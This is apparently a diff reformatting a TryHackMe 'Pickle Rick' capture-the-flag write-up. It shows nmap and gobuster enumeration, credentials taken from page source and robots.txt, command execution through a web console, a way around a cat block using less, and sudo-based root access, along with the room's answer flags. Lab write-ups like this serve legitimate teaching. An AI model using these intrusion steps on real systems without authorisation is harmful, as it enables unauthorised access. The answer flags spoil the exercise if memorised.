@@ -1,21 +1,28 @@
-# Pickle Rick
+# TryHackMe CTF
+
+> This write-up has been reformatted using AI from my original notes for clarity and better viewing
 
 ## Machine Information
 
--   **Machine Name:** Pickle Rick
--   **Date:** 1/26/2026
--   **Date Completed:** 1/27/2026
--   **Status:** Completed
--   **Attacker OS:** Kali Linux
--   **Difficulty:** Easy
+| Field            | Details     |
+| ---------------- | ----------- |
+| **Machine Name** | Pickle Rick |
+| **Date**         | 1/26/2026   |
+| **Completed**    | 1/27/2026   |
+| **Attacker OS**  | Kali Linux  |
+| **Difficulty**   | Easy        |
 
 ---
 
-## Objectives / Room Questions
+## Room Questions
 
--   **First ingredient Rick needs:** `mr. meeseek hair`
--   **Second ingredient in Rick’s potion:** `1 jerry tear`
--   **Final ingredient:** `fleeb juice`
+### Task 2: Reconnaissance
+
+| Question                            | Answer                                                         |
+| ----------------------------------- | -------------------------------------------------------------- |
+| First ingredient Rick needs?        | <details><summary>Reveal</summary>`mr. meeseek hair`</details> |
+| Second ingredient in Rick's potion? | <details><summary>Reveal</summary>`1 jerry tear`</details>     |
+| Final ingredient?                   | <details><summary>Reveal</summary>`fleeb juice`</details>      |
 
 ---
 
@@ -23,38 +30,43 @@
 
 ### Nmap Scan
 
-`nmap -p- -sS -sC -sV --min-rate 1000 -Pn 10.64.191.231`
-    
+```bash
+nmap -p- -sS -sC -sV --min-rate 1000 -Pn 10.64.191.231
+```
 
 ### Scan Summary
 
--   **Target:** 10.64.191.231
--   **Host Status:** Up (0.038s latency)
--   **Operating System:** Linux
--   **Ports Scanned:** 65,535 TCP
--   **Closed Ports:** 65,533 (reset)
--   **Nmap Version:** 7.98
--   **Scan Duration:** 22.55 seconds
--   **Scan Timestamp:** 2026-01-26 22:37 -0500
+**Scan Date:** 2026-01-26 at 22:37 EST | **Duration:** 22.55 seconds | **Host Status:** Up (latency: 0.038s)
 
-### Open Ports & Services
+#### Open Ports
 
-| Port | State | Service | Version / Notes |
-| --- | --- | --- | --- |
-| 22/tcp | open | SSH | OpenSSH 8.2p1 (Ubuntu 4ubuntu0.11) |
-| 80/tcp | open | HTTP | Apache httpd 2.4.41 (Ubuntu) |
+| Port   | State | Service | Version                          |
+| ------ | ----- | ------- | -------------------------------- |
+| 22/tcp | Open  | SSH     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 |
+| 80/tcp | Open  | HTTP    | Apache httpd 2.4.41 (Ubuntu)     |
 
-### SSH Host Keys
+> 65,533 closed TCP ports not shown (all returned reset)
 
-RSA     3072  05:ea:74:5a:16:08:35:c1:fc:d7:01:2a:f5:c0:44:b8
-ECDSA    256  ef:cd:49:ae:0f:a0:8b:42:92:d1:2c:e8:cb:0f:6c:bc
-ED25519  256  86:cd:3e:5c:e2:df:f9:89:a4:a8:93:9f:d8:85:f3:6b
-    
+#### Port 22 — SSH
 
-### Web Service Overview
+**Service:** OpenSSH 8.2p1 (Ubuntu 4ubuntu0.11)
 
--   **Port:** 80/tcp
--   **Web Server:** Apache/2.4.41
+| Key Type | Bits | Fingerprint                                       |
+| -------- | ---- | ------------------------------------------------- |
+| RSA      | 3072 | `05:ea:74:5a:16:08:35:c1:fc:d7:01:2a:f5:c0:44:b8` |
+| ECDSA    | 256  | `ef:cd:49:ae:0f:a0:8b:42:92:d1:2c:e8:cb:0f:6c:bc` |
+| ED25519  | 256  | `86:cd:3e:5c:e2:df:f9:89:a4:a8:93:9f:d8:85:f3:6b` |
+
+#### Port 80 — HTTP
+
+**Service:** Apache httpd 2.4.41 (Ubuntu) | **Server Header:** `Apache/2.4.41 (Ubuntu)`
+
+Supported Methods: `GET` `HEAD` `POST` `OPTIONS`
+
+**Notes:**
+
+- Port 80 is running a Rick and Morty themed site — likely the main attack surface.
+- SSH is available but will likely require credentials found elsewhere on the box.
 
 ---
 
@@ -69,7 +81,6 @@ Accessing the web server reveals a themed landing page requesting help locating 
 ### Source Code Analysis
 
 ```html
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -88,7 +99,6 @@ Accessing the web server reveals a themed landing page requesting help locating 
   </style>
 </head>
 <body>
-
   <div class="container">
     <div class="jumbotron"></div>
     <h1>Help Morty!</h1></br>
@@ -98,33 +108,25 @@ Accessing the web server reveals a themed landing page requesting help locating 
   </div>
 
   <!--
-
     Note to self, remember username!
-
     Username: R1ckRul3s
-
   -->
 
 </body>
 </html>
-
 ```
-    
 
 **Credential Discovered:**
 
--   **Username:** `R1ckRul3s`
+- **Username:** `R1ckRul3s`
 
 This suggests potential credential reuse for authentication services such as SSH or restricted web endpoints.
 
 ### Directory Brute Forcing
 
-`gobuster dir -u http://10.65.180.225 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,js,bak,old,zip,log,conf,inc -t 40 -b 403,404 --timeout 10s`
-    
-
-### Gobuster Command Explanation
-
-This command performs directory and file enumeration against the target web server using a large wordlist and common file extensions. It ignores 403 and 404 responses to reduce noise and uses multiple threads to improve speed.
+```bash
+gobuster dir -u http://10.65.180.225 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,js,bak,old,zip,log,conf,inc -t 40 -b 403,404 --timeout 10s
+```
 
 ### Gobuster Output
 
@@ -150,75 +152,63 @@ index.html           (Status: 200) [Size: 1062]
 portal.php           (Status: 302) [Size: 0] [--> /login.php]
 robots.txt           (Status: 200) [Size: 17]
 denied.php           (Status: 302) [Size: 0] [--> /login.php]
-index.html           (Status: 200) [Size: 1062]
 Progress: 685091 / 685091 (100.00%)
 ===============================================================
 Finished
 ===============================================================
-
 ```
-    
 
-## Gobuster Enumeration Results – Analysis Notes
+### Directory Analysis
 
-The scan identified multiple valid endpoints, indicating a functional web application with authentication logic and static assets.
+- **`/login.php`** — Accessible login endpoint and primary attack surface.
+- **`/portal.php`** — Redirects to login, indicating access control.
+- **`/denied.php`** — Authorization failure handler.
+- **`/index.html`** — Main landing page.
+- **`/assets/`** — Static content directory.
+- **`/robots.txt`** — Potential source of hidden paths.
 
-### Key Findings
+### Exploring the Directories
 
--   **login.php:** Accessible login endpoint and primary attack surface.
--   **portal.php:** Redirects to login, indicating access control.
--   **denied.php:** Authorization failure handler.
--   **index.html:** Main landing page.
--   **assets/:** Static content directory.
--   **robots.txt:** Potential source of hidden paths.
+**robots.txt:**
 
----
-
-## Exploring the directories
-- Robots.txt
 ```bash
 saintmichael@archangelkali~ > curl http://10.65.180.225/robots.txt
 Wubbalubbadubdub
 ```
 
+**assets/ directory:**
 
-# Index of /assets
+| Type  | Name              | Last Modified    | Size |
+| ----- | ----------------- | ---------------- | ---- |
+| [TXT] | bootstrap.min.css | 2019-02-10 16:37 | 119K |
+| [JS]  | bootstrap.min.js  | 2019-02-10 16:37 | 37K  |
+| [IMG] | fail.gif          | 2019-02-10 16:37 | 49K  |
+| [JS]  | jquery.min.js     | 2019-02-10 16:37 | 85K  |
+| [IMG] | picklerick.gif    | 2019-02-10 16:37 | 222K |
+| [IMG] | portal.jpg        | 2019-02-10 16:37 | 50K  |
+| [IMG] | rickandmorty.jpeg | 2019-02-10 16:37 | 488K |
 
-| Type | Name | Last Modified | Size | Description |
-| --- | --- | --- | --- | --- |
-| \[PARENTDIR\] | Parent Directory | \- | \- |  |
-| \[TXT\] | bootstrap.min.css | 2019-02-10 16:37 | 119K |  |
-| \[JS\] | bootstrap.min.js | 2019-02-10 16:37 | 37K |  |
-| \[IMG\] | fail.gif | 2019-02-10 16:37 | 49K |  |
-| \[JS\] | jquery.min.js | 2019-02-10 16:37 | 85K |  |
-| \[IMG\] | picklerick.gif | 2019-02-10 16:37 | 222K |  |
-| \[IMG\] | portal.jpg | 2019-02-10 16:37 | 50K |  |
-| \[IMG\] | rickandmorty.jpeg | 2019-02-10 16:37 | 488K |  |
-
-Nothing really useful here
+Nothing really useful here.
 
 ![loginportal](https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/picklerick2.png)
 
-Looking back to our previous notes we already have a username and a possible password?
-might as well give it a try
+Looking back at our previous notes we already have a username and a possible password — might as well give it a try:
 
 - **Username:** `R1ckRul3s`
-- **Possible password?:** `Wubbalubbadubdub` = this was pulled from robots.txt
+- **Possible password:** `Wubbalubbadubdub` — pulled from robots.txt
 
-Login was possible
+Login was successful!
 
-## Investigating login.php
+---
 
-```HTML
+## 3. Investigating login.php
+
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <title>Rick is sup4r cool</title>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="stylesheet" href="assets/bootstrap.min.css">
-  <script src="assets/jquery.min.js"></script>
-  <script src="assets/bootstrap.min.js"></script>
+  ...
 </head>
 <body>
   <nav class="navbar navbar-inverse">
@@ -230,7 +220,6 @@ Login was possible
         <li class="active"><a href="#">Commands</a></li>
         <li><a href="/denied.php">Potions</a></li>
         <li><a href="/denied.php">Creatures</a></li>
-        <li><a href="/denied.php">Potions</a></li>
         <li><a href="/denied.php">Beth Clone Notes</a></li>
       </ul>
     </div>
@@ -242,72 +231,50 @@ Login was possible
       <input type="text" class="form-control" name="command" placeholder="Commands"/></br>
       <input type="submit" value="Execute" class="btn btn-success" name="sub"/>
     </form>
-        <!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== -->
+    <!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== -->
   </div>
 </body>
 </html>
+```
+
+We have a Base64 encoded string hidden in a comment:
 
 ```
+Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
 ```
-- We have a base64 encoded string
-`Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==`
-Decodes to
-`VmpGU1NtVkdTWGxTYkdScFUwWktjRlZyVmt0VE1WWnhVMjA1VG1KSGVIbFhhMXBoVlZaV1ZVMUVhejA=`
-decodes to
-`VjFSSmVGSXlSbGRpU0ZKcFVrVktTMVZxU205TmJHeHlXa1phVVZWVU1Eaz0`
-decodes to
-`V1RJeFIyRldiSFJpUkVKS1VqSm9NbGxyWkZaUVVUMDk=`
-decodes to 
-`WTIxR2FWbHRiREJKUjJoMllrZFZQUT09`
-decodes to
-`Y21GaVltbDBJR2h2YkdVPQ==`
-decodes to
-`cmFiYml0IGhvbGU=`
-decodes to
-`rabbit hole`
 
-lmao sick. so that was a waste of time. 
-```
-## Command Console Notes
+Decoding it layer by layer eventually reveals... `rabbit hole`
 
-Let’s take a look at the command console:
+Lmao. So that was a waste of time.
+
+---
+
+## 4. Command Console
 
 ![codeexecution](https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/picklerick3.png)
 
 From the console, we can successfully run `ls`, but we do **not** have permission to use `cat` to read files directly.
 
-Next, we check our current user context:
-
 ```bash
->whoami
+whoami
 www-data
 ```
 
-This confirms we are operating as the low-privileged `www-data` user. Since `cat` is restricted, the next step is to look for alternative commands that can still display file contents.
-
-One such option is `less`:
+This confirms we are operating as the low-privileged `www-data` user. Since `cat` is restricted, we look for alternative commands that can display file contents. `less` works:
 
 ```bash
 less Sup3rS3cretPickl3Ingred.txt
 ```
 
-`less` is a file pager, and in some restricted environments it is allowed even when `cat` is blocked. In this case, it successfully reveals the contents of the file.
-
 **Flag 1:** `mr. meeseek hair`
 
-This demonstrates a common weakness in command restrictions: blocking a specific tool does not block the underlying capability, only the most obvious way to reach it.
-
-Next, we examine **clue.txt**:
+Next, we examine **clue.txt:**
 
 ```plaintext
 Look around the file system for the other ingredient.
 ```
 
-This hint suggests the flag isn’t handed to us directly. Instead, we need to enumerate the filesystem and search for additional files that may contain the remaining ingredient.
-
-At this stage, directory traversal and careful inspection of accessible paths become the priority.
-
-Running `find /home -type f -readable 2>/dev/null` produced a very large amount of output, revealing numerous readable files across user directories.
+Running `find /home -type f -readable 2>/dev/null` reveals:
 
 ```
 /home/ubuntu/.bash_logout
@@ -317,9 +284,9 @@ Running `find /home -type f -readable 2>/dev/null` produced a very large amount 
 /home/rick/second ingredients
 ```
 
-Among these results, `/home/rick/second ingredients` stands out. We list the contents of the `/home/rick` directory to gather more context:
+`/home/rick/second ingredients` stands out. Listing the directory:
 
-```
+```bash
 ls /home/rick -la
 
 total 12
@@ -328,57 +295,30 @@ drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
 -rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
 ```
 
-The file is owned by `root`, has world-writable and executable permissions, and uses a name with spaces, which warrants closer inspection. To determine its actual type, we use the `file` command:
-
-```
+```bash
 file /home/rick/"second ingredients"
 /home/rick/second ingredients: ASCII text
 ```
 
-Since the file is identified as plain text, we safely view its contents using a pager:
-
-```
+```bash
 less /home/rick/"second ingredients"
 ```
 
 **Flag 2:** `1 jerry tear`
 
-Now we need to find the last flag so lets re check what directories we have
-`ls /`
+Now we check what directories we have:
 
-```
-bin
-boot
-dev
-etc
-home
-initrd.img
-initrd.img.old
-lib
-lib64
-lost+found
-media
-mnt
-opt
-proc
-root
-run
-sbin
-snap
-srv
-sys
-tmp
-usr
-var
-vmlinuz
-vmlinuz.old
+```bash
+ls /
+
+bin boot dev etc home initrd.img initrd.img.old lib lib64
+lost+found media mnt opt proc root run sbin snap srv sys
+tmp usr var vmlinuz vmlinuz.old
 ```
 
-At this point, it makes sense to inspect the `root` account more closely.
+We inspect sudo permissions for the current user:
 
-Running `ls /root` initially returns no output, but this alone does not confirm that access is fully restricted. To better understand our privileges, we enumerate sudo permissions for the current user.
-
-```
+```bash
 sudo -l
 
 Matching Defaults entries for www-data on ip-10-64-138-139:
@@ -388,24 +328,65 @@ User www-data may run the following commands on ip-10-64-138-139:
     (ALL) NOPASSWD: ALL
 ```
 
-This output reveals a critical misconfiguration: the `www-data` user is allowed to run _any_ command as `root` without providing a password.
+Critical misconfiguration — `www-data` can run any command as root without a password. We retry listing the root directory:
 
-With unrestricted sudo access confirmed, we retry listing the root directory using elevated privileges:
-
-```
+```bash
 sudo ls /root
-
 3rd.txt
 snap
 ```
 
-A file named `3rd.txt` is present in the root directory. We open it using `less` to safely view its contents:
-
-```
+```bash
 sudo less /root/3rd.txt
 3rd ingredients: fleeb juice
 ```
 
 **Final Flag:** `fleeb juice`
 
+---
 
+> **New to CTFs?** This section breaks down the core concepts used in this room so you can understand _why_ each step worked — not just _what_ was done.
+
+---
+
+## Key Takeaways for Beginners
+
+### 1. Always Check the Page Source
+
+The username `R1ckRul3s` was hidden in an HTML comment on the main page. Always view source on every page — developers often leave sensitive information behind accidentally.
+
+### 2. robots.txt Can Leak Sensitive Information
+
+`robots.txt` is meant to tell search engine bots which pages to ignore, but CTF designers (and careless developers) sometimes put sensitive info there. In this case it contained the password `Wubbalubbadubdub`.
+
+### 3. Credential Reuse Is Common
+
+The username from the source code and the string from robots.txt combined to give us a working login. Always try combining discovered strings as credentials — it works more often than you'd think.
+
+### 4. Blocking One Command Doesn't Block the Capability
+
+`cat` was restricted but `less` wasn't. This is a common mistake — blocking a specific binary doesn't prevent someone from achieving the same result with a different tool. `strings`, `more`, `tac`, and `head` can all read files too.
+
+### 5. Always Check `sudo -l`
+
+After getting a shell, checking sudo permissions should be one of your first commands. Finding `(ALL) NOPASSWD: ALL` is essentially game over — you have unrestricted root access without even needing a password.
+
+### 6. Follow the Clues
+
+Each flag pointed to the next step. `clue.txt` told us to look around the filesystem, which led us to `/home/rick`. The box rewards methodical enumeration over guessing.
+
+### Tools Used in This Room
+
+| Tool       | Purpose                                            |
+| ---------- | -------------------------------------------------- |
+| `nmap`     | Port scanning and service detection                |
+| `gobuster` | Web directory and file enumeration                 |
+| `curl`     | Fetching web content from the terminal             |
+| `find`     | Locating files across the filesystem               |
+| `less`     | Reading file contents when `cat` is blocked        |
+| `sudo -l`  | Checking sudo permissions for privilege escalation |
+| CyberChef  | Decoding Base64 strings                            |
+
+---
+
+> This write-up was created by `saintmichael`
